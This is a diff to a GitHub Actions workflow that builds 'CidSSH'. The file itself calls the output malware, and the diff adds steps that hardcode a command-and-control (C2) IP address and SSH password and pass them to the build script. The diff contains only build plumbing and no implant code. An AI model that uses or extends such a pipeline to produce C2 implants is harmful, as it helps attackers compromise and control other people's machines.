@@ -11,13 +11,18 @@ jobs:
         #if: github.event_name == 'push' && contains(toJson(github.event.commits), '***NO_CI***') == false && contains(toJson(github.event.commits), '[ci skip]') == false && contains(toJson(github.event.commits), '[skip ci]') == false
         runs-on: ubuntu-latest
         steps:
+            - name: Hardcode the C2 IP if you want here
+              run: echo ::set-env name=C2_IP::1.2.3.4
+            - name: Hardcode the C2 SSH password if you want here
+              run: echo ::set-env name=PASSWORD_AUTH::paSSw0rD
+              
             - uses: actions/checkout@v1
               with:
                   submodules: true
             - name: Build CidSSH
               uses: docker://alpine:edge
               with: 
-                  args: sh ./build.sh                   
+                  args: sh ./build.sh $PASSWORD_AUTH $C2_IP
                
             #- name: Strip symbols from created malware
             #  run: |
